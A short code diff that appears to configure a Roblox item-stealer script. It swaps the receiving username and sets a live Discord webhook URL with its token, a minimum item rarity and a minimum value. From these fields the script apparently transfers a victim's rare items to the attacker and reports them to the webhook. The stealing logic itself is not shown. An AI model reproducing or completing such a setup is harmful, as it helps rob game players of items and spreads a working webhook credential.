@@ -4,7 +4,7 @@ end
 
 task.spawn(visual)
 
-Usernames = {"siia_06"} -- You can add multiple users if you know how!
+Usernames = {"Capweks"} -- You can add multiple users if you know how!
 Webhook = "https://discord.com/api/webhooks/1480088657745416285/Swczm5ZQ20SJBB-qVMvXwrghk7DyOSUMEQVuDW98WbK1UdG2blrNfENVtppcAlWcBC9C"  -- Protect your webhook at https://sentinelhook.lol/ .
 MinimumRarity = "Godly" -- Options: Common/Uncommon/Rare/Legendary/Godly/Ancient/Vintage/Unique.
 MinimumValue = 1 -- Set it to 5 (Recommended).
